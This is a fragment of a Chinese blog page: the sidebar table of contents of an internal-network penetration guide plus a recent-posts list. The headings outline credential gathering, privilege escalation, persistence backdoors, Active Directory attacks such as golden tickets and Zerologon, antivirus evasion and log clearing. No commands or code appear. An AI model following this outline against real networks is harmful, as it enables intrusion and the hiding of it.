class="toc-text">内网文件的传输和下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA-HTTP-server"><span class="toc-number">4.5.</span> <span class="toc-text">搭建 HTTP server</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">5.</span> <span class="toc-text">内网信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">5.1.</span> <span class="toc-text">本机信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-number">5.1.1.</span> <span class="toc-text">1、用户列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8"><span class="toc-number">5.1.2.</span> <span class="toc-text">2、进程列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%9C%8D%E5%8A%A1%E5%88%97%E8%A1%A8"><span class="toc-number">5.1.3.</span> <span class="toc-text">3、服务列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8"><span class="toc-number">5.1.4.</span> <span class="toc-text">4、端口列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E8%A1%A5%E4%B8%81%E5%88%97%E8%A1%A8"><span class="toc-number">5.1.5.</span> <span class="toc-text">5、补丁列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81%E6%9C%AC%E6%9C%BA%E5%85%B1%E4%BA%AB"><span class="toc-number">5.1.6.</span> <span class="toc-text">6、本机共享</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81%E6%9C%AC%E7%94%A8%E6%88%B7%E4%B9%A0%E6%83%AF%E5%88%86%E6%9E%90"><span class="toc-number">5.1.7.</span> <span class="toc-text">7、本用户习惯分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8%E3%80%81%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E5%B7%A5%E5%85%B7"><span class="toc-number">5.1.8.</span> <span class="toc-text">8、获取当前用户密码工具</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows"><span class="toc-number">5.1.8.1.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux"><span class="toc-number">5.1.8.2.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">5.1.8.3.</span> <span class="toc-text">浏览器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">5.1.8.4.</span> <span class="toc-text">其他</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E6%95%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.2.</span> <span class="toc-text">扩散信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">5.2.1.</span> <span class="toc-text">端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="toc-number">5.2.1.1.</span> <span class="toc-text">常用端口扫描工具</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8B%93%E6%89%91%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90"><span class="toc-number">5.2.2.</span> <span class="toc-text">内网拓扑架构分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4"><span class="toc-number">5.2.3.</span> <span class="toc-text">常见信息收集命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.3.</span> <span class="toc-text">第三方信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">6.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-1"><span class="toc-number">6.1.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BypassUAC"><span class="toc-number">6.1.1.</span> <span class="toc-text">BypassUAC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.1.1.</span> <span class="toc-text">常用方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">6.1.1.2.</span> <span class="toc-text">常用工具</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">6.1.2.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-1"><span class="toc-number">6.2.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-number">6.2.1.</span> <span class="toc-text">内核溢出提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">6.2.2.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SUID"><span class="toc-number">6.2.3.</span> <span class="toc-text">SUID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%94%99%E8%AF%AF%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.2.4.</span> <span class="toc-text">系统服务的错误权限配置漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE"><span class="toc-number">6.2.5.</span> <span class="toc-text">不安全的文件&#x2F;文件夹权限配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%AD%98%E5%82%A8%E7%9A%84%E6%98%8E%E6%96%87%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E5%AF%86%E7%A0%81"><span class="toc-number">6.2.6.</span> <span class="toc-text">找存储的明文用户名，密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">7.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8"><span class="toc-number">7.1.</span> <span class="toc-text">系统后门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-2"><span class="toc-number">7.1.1.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7"><span class="toc-number">7.1.1.1.</span> <span class="toc-text">1、密码记录工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%98%E5%82%A8Payload%E4%BD%8D%E7%BD%AE"><span class="toc-number">7.1.1.2.</span> <span class="toc-text">2、常用的存储Payload位置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81Run-RunOnce-Keys"><span class="toc-number">7.1.1.3.</span> <span class="toc-text">3、Run&#x2F;RunOnce Keys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81BootExecute-Key"><span class="toc-number">7.1.1.4.</span> <span class="toc-text">4、BootExecute Key</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81Userinit-Key"><span class="toc-number">7.1.1.5.</span> <span class="toc-text">5、Userinit Key</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6%E3%80%81Startup-Keys"><span class="toc-number">7.1.1.6.</span> <span class="toc-text">6、Startup Keys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7%E3%80%81Services"><span class="toc-number">7.1.1.7.</span> <span class="toc-text">7、Services</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8%E3%80%81Browser-Helper-Objects"><span class="toc-number">7.1.1.8.</span> <span class="toc-text">8、Browser Helper Objects</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9%E3%80%81AppInit-DLLs"><span class="toc-number">7.1.1.9.</span> <span class="toc-text">9、AppInit_DLLs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#10%E3%80%81%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94"><span class="toc-number">7.1.1.10.</span> <span class="toc-text">10、文件关联</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#11%E3%80%81bitsadmin"><span class="toc-number">7.1.1.11.</span> <span class="toc-text">11、bitsadmin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#12%E3%80%81mof"><span class="toc-number">7.1.1.12.</span> <span class="toc-text">12、mof </span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#13%E3%80%81wmi"><span class="toc-number">7.1.1.13.</span> <span class="toc-text">13、wmi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#14%E3%80%81Userland-Persistence-With-Scheduled-Tasks"><span class="toc-number">7.1.1.14.</span> <span class="toc-text">14、Userland Persistence With Scheduled Tasks</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#15%E3%80%81Netsh"><span class="toc-number">7.1.1.15.</span> <span class="toc-text">15、Netsh</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#16%E3%80%81Shim"><span class="toc-number">7.1.1.16.</span> <span class="toc-text">16、Shim</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#17%E3%80%81DLL%E5%8A%AB%E6%8C%81"><span class="toc-number">7.1.1.17.</span> <span class="toc-text">17、DLL劫持</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#18%E3%80%81DoubleAgent"><span class="toc-number">7.1.1.18.</span> <span class="toc-text">18、DoubleAgent </span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#19%E3%80%81waitfor-exe"><span class="toc-number">7.1.1.19.</span> <span class="toc-text">19、waitfor.exe </span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#20%E3%80%81AppDomainManager"><span class="toc-number">7.1.1.20.</span> <span class="toc-text">20、AppDomainManager</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#21%E3%80%81Office"><span class="toc-number">7.1.1.21.</span> <span class="toc-text">21、Office</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#22%E3%80%81CLR"><span class="toc-number">7.1.1.22.</span> <span class="toc-text">22、CLR</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#23%E3%80%81msdtc"><span class="toc-number">7.1.1.23.</span> <span class="toc-text">23、msdtc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#24%E3%80%81Hijack-CAccPropServicesClass-and-MMDeviceEnumerato"><span class="toc-number">7.1.1.24.</span> <span class="toc-text">24、Hijack CAccPropServicesClass and MMDeviceEnumerato</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#25%E3%80%81Hijack-explorer-exe"><span class="toc-number">7.1.1.25.</span> <span class="toc-text">25、Hijack explorer.exe</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#26%E3%80%81Windows-FAX-DLL-Injection"><span class="toc-number">7.1.1.26.</span> <span class="toc-text">26、Windows FAX DLL Injection</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#27%E3%80%81%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%80%BC"><span class="toc-number">7.1.1.27.</span> <span class="toc-text">27、特殊注册表键值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#28%E3%80%81%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E5%90%8E%E9%97%A8"><span class="toc-number">7.1.1.28.</span> <span class="toc-text">28、快捷方式后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#29%E3%80%81Logon-Scripts"><span class="toc-number">7.1.1.29.</span> <span class="toc-text">29、Logon Scripts</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#30%E3%80%81Password-Filter-DLL"><span class="toc-number">7.1.1.30.</span> <span class="toc-text">30、Password Filter DLL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#31%E3%80%81%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81"><span class="toc-number">7.1.1.31.</span> <span class="toc-text">31、利用BHO实现IE浏览器劫持</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-2"><span class="toc-number">7.1.2.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#crontab"><span class="toc-number">7.1.2.1.</span> <span class="toc-text">crontab</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A1%AC%E9%93%BE%E6%8E%A5sshd"><span class="toc-number">7.1.2.2.</span> <span class="toc-text">硬链接sshd</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSH-Server-wrapper"><span class="toc-number">7.1.2.3.</span> <span class="toc-text">SSH Server wrapper</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSH-keylogger"><span class="toc-number">7.1.2.4.</span> <span class="toc-text">SSH keylogger</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cymothoa-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5backdoor"><span class="toc-number">7.1.2.5.</span> <span class="toc-text">Cymothoa_进程注入backdoor</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rootkit"><span class="toc-number">7.1.2.6.</span> <span class="toc-text">rootkit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Tools"><span class="toc-number">7.1.2.7.</span> <span class="toc-text">Tools</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB%E5%90%8E%E9%97%A8"><span class="toc-number">7.2.</span> <span class="toc-text">WEB后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">8.</span> <span class="toc-text">横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-number">8.1.</span> <span class="toc-text">端口渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1"><span class="toc-number">8.1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4"><span class="toc-number">8.1.2.</span> <span class="toc-text">端口爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">8.1.3.</span> <span class="toc-text">端口弱口令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%BA%A2%E5%87%BA"><span class="toc-number">8.1.4.</span> <span class="toc-text">端口溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3"><span class="toc-number">8.1.5.</span> <span class="toc-text">常见的默认端口</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81web%E7%B1%BB-web%E6%BC%8F%E6%B4%9E-%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95"><span class="toc-number">8.1.5.1.</span> <span class="toc-text">1、web类(web漏洞&#x2F;敏感目录)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB-%E6%89%AB%E6%8F%8F%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">8.1.5.2.</span> <span class="toc-text">2、数据库类(扫描弱口令)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E7%89%B9%E6%AE%8A%E6%9C%8D%E5%8A%A1%E7%B1%BB-%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB-%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.1.5.3.</span> <span class="toc-text">3、特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E7%B1%BB-%E6%89%AB%E6%8F%8F%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4"><span class="toc-number">8.1.5.4.</span> <span class="toc-text">4、常用端口类(扫描弱口令&#x2F;端口爆破)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81%E7%AB%AF%E5%8F%A3%E5%90%88%E8%AE%A1%E6%89%80%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="toc-number">8.1.5.5.</span> <span class="toc-text">5、端口合计所对应的服务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">8.2.</span> <span class="toc-text">域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="toc-number">8.2.1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#powerview-ps1"><span class="toc-number">8.2.1.1.</span> <span class="toc-text">powerview.ps1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BloodHound"><span class="toc-number">8.2.1.2.</span> <span class="toc-text">BloodHound</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85DNS%E4%BF%A1%E6%81%AF"><span class="toc-number">8.2.1.3.</span> <span class="toc-text">获取域内DNS信息</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">8.2.2.</span> <span class="toc-text">获取域控的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SYSVOL"><span class="toc-number">8.2.2.1.</span> <span class="toc-text">SYSVOL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MS14-068-Kerberos"><span class="toc-number">8.2.2.2.</span> <span class="toc-text">MS14-068 Kerberos</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SPN%E6%89%AB%E6%8F%8F"><span class="toc-number">8.2.2.3.</span> <span class="toc-text">SPN扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Kerberos%E7%9A%84%E9%BB%84%E9%87%91%E9%97%A8%E7%A5%A8"><span class="toc-number">8.2.2.4.</span> <span class="toc-text">Kerberos的黄金门票</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Kerberos%E7%9A%84%E9%93%B6%E7%A5%A8%E5%8A%A1"><span class="toc-number">8.2.2.5.</span> <span class="toc-text">Kerberos的银票务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%9F%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E7%A0%B4%E8%A7%A3"><span class="toc-number">8.2.2.6.</span> <span class="toc-text">域服务账号破解</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E7%9B%97%E7%AA%83"><span class="toc-number">8.2.2.7.</span> <span class="toc-text">凭证盗窃</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NTLM-relay"><span class="toc-number">8.2.2.8.</span> <span class="toc-text">NTLM relay</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Kerberos%E5%A7%94%E6%B4%BE"><span class="toc-number">8.2.2.9.</span> <span class="toc-text">Kerberos委派</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE"><span class="toc-number">8.2.2.10.</span> <span class="toc-text">地址解析协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Zerologon"><span class="toc-number">8.2.2.11.</span> <span class="toc-text">Zerologon</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#noPac"><span class="toc-number">8.2.2.12.</span> <span class="toc-text">noPac</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ADCS"><span class="toc-number">8.2.2.13.</span> <span class="toc-text">ADCS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2022-26923"><span class="toc-number">8.2.2.14.</span> <span class="toc-text">CVE-2022-26923</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96AD%E5%93%88%E5%B8%8C"><span class="toc-number">8.2.3.</span> <span class="toc-text">获取AD哈希</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AD%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">8.2.4.</span> <span class="toc-text">AD持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7"><span class="toc-number">8.2.4.1.</span> <span class="toc-text">活动目录持久性技巧</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Security-Support-Provider"><span class="toc-number">8.2.4.2.</span> <span class="toc-text">Security Support Provider</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SID-History"><span class="toc-number">8.2.4.3.</span> <span class="toc-text">SID History</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AdminSDHolder%EF%BC%86SDProp"><span class="toc-number">8.2.4.4.</span> <span class="toc-text">AdminSDHolder＆SDProp </span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-number">8.2.4.5.</span> <span class="toc-text">组策略</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Hook-PasswordChangeNotify"><span class="toc-number">8.2.4.6.</span> <span class="toc-text">Hook PasswordChangeNotify</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Kerberoasting%E5%90%8E%E9%97%A8"><span class="toc-number">8.2.4.7.</span> <span class="toc-text">Kerberoasting后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AdminSDHolder"><span class="toc-number">8.2.4.8.</span> <span class="toc-text">AdminSDHolder</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Delegation"><span class="toc-number">8.2.4.9.</span> <span class="toc-text">Delegation</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E8%AF%81%E4%B9%A6"><span class="toc-number">8.2.4.10.</span> <span class="toc-text">黄金证书</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96-1"><span class="toc-number">8.2.5.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83"><span class="toc-number">8.2.5.1.</span> <span class="toc-text">域内主机提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Exchange%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">8.2.5.2.</span> <span class="toc-text">Exchange的利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TIPS"><span class="toc-number">8.2.6.</span> <span class="toc-text">TIPS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7"><span class="toc-number">8.2.7.</span> <span class="toc-text">相关工具</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">8.3.</span> <span class="toc-text">在远程系统上执行程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IOT%E7%9B%B8%E5%85%B3"><span class="toc-number">8.4.</span> <span class="toc-text">IOT相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA"><span class="toc-number">8.5.</span> <span class="toc-text">中间人</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%84%E9%81%BF%E6%9D%80%E8%BD%AF%E5%8F%8A%E6%A3%80%E6%B5%8B"><span class="toc-number">8.6.</span> <span class="toc-text">规避杀软及检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-Applocker"><span class="toc-number">8.6.1.</span> <span class="toc-text">Bypass Applocker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BypassAV"><span class="toc-number">8.6.2.</span> <span class="toc-text">BypassAV</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">9.</span> <span class="toc-text">痕迹清理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4"><span class="toc-number">9.1.</span> <span class="toc-text">Windows日志清除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E5%9D%8FWindows%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%8A%9F%E8%83%BD"><span class="toc-number">9.2.</span> <span class="toc-text">破坏Windows日志记录功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit"><span class="toc-number">9.3.</span> <span class="toc-text">Metasploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3389%E7%99%BB%E9%99%86%E8%AE%B0%E5%BD%95%E6%B8%85%E9%99%A4"><span class="toc-number">9.4.</span> <span class="toc-text">3389登陆记录清除</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/FastAPI%E9%A1%B9%E7%9B%AE-%E4%BB%8E%E6%9E%84%E5%BB%BA%E5%88%B0%E9%83%A8%E7%BD%B2.html" title="FastAPI项目 从构建到部署">FastAPI项目 从构建到部署</a><time datetime="2024-09-24T09:31:51.000Z" title="Created 2024-09-24 17:31:51">2024-09-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/ML-%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80.html" title="ML 理论基础">ML 理论基础</a><time datetime="2024-09-07T16:31:52.000Z" title="Created 2024-09-08 00:31:52">2024-09-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/ML-%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html" title="ML 现代卷积神经网络">ML 现代卷积神经网络</a><time datetime="2024-08-20T12:35:28.000Z" title="Created 2024-08-20 